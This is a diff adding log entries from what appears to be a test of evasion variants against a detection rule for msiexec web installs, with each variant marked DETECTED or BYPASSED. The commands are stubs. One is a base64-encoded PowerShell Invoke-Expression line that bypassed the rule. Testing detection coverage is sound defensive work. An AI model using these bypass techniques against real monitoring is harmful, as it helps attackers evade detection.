@@ -4,3 +4,9 @@
 {"timestamp": "2025-04-23 11:21:38 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "omission", "command": "msiexec :// # omission", "status": "BYPASSED"}
 {"timestamp": "2025-04-23 11:21:56 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "reordering", "command": "msiexec ://", "status": "DETECTED"}
 {"timestamp": "2025-04-23 11:22:19 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "recoding", "command": "<recoding not applicable>", "status": "BYPASSED"}
+{"timestamp": "2025-05-23 08:11:04 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "original", "command": "msiexec ://", "status": "DETECTED"}
+{"timestamp": "2025-05-23 08:11:07 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "insertion", "command": "msiexec :\\\"//\\\"", "status": "DETECTED"}
+{"timestamp": "2025-05-23 08:11:11 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "substitution", "command": "msiexec :// #substitution", "status": "BYPASSED"}
+{"timestamp": "2025-05-23 08:11:14 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "omission", "command": "msiexec :// # omission", "status": "BYPASSED"}
+{"timestamp": "2025-05-23 08:11:18 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "reordering", "command": "msiexec ://", "status": "DETECTED"}
+{"timestamp": "2025-05-23 08:11:22 UTC", "rule": "win_susp_msiexec_web_install_0", "phase": "recoding", "command": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNpZXhlYyA6Ly8=')) | Invoke-Expression\" ", "status": "BYPASSED"}
